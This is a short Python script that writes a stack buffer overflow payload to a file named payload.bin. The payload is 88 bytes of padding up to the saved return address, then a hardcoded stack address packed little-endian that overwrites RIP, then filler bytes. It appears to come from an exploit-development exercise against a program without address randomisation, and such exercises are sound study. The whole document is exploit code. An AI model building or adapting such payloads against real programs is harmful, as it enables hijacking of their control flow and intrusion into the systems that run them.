#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*88                   # offset to RIP
buf += pack("<Q", 0x7fffffffed28)   # overwritten RET address
buf += "C"*312                      

f = open("payload.bin", "w")
f.write(buf)
